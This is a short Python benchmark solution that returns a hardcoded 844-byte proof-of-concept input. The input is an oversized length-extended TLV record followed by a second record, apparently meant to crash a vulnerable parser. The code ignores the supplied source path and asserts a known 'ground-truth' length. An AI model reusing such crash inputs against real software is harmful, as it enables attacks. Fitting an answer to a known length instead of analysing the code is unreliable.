import sys, os, tarfile, io, re, typing, struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Pre-crafted PoC for the vulnerability.
        tlv1_type = 0x01
        tlv1_len_marker = 0xFF           # Indicates extended length
        tlv1_ext_len = 0x0330            # 816 bytes
        tlv1_value = b'A' * tlv1_ext_len

        tlv2_type = 0x02
        tlv2_len = 0x16                  # 22 bytes
        tlv2_value = b'B' * tlv2_len

        poc = bytes([tlv1_type, tlv1_len_marker]) \
              + struct.pack('>H', tlv1_ext_len) \
              + tlv1_value \
              + bytes([tlv2_type, tlv2_len]) \
              + tlv2_value

        # Ensure generated PoC is exactly 844 bytes (ground-truth length)
        assert len(poc) == 844, f"Unexpected PoC size: {len(poc)} bytes"

        return poc
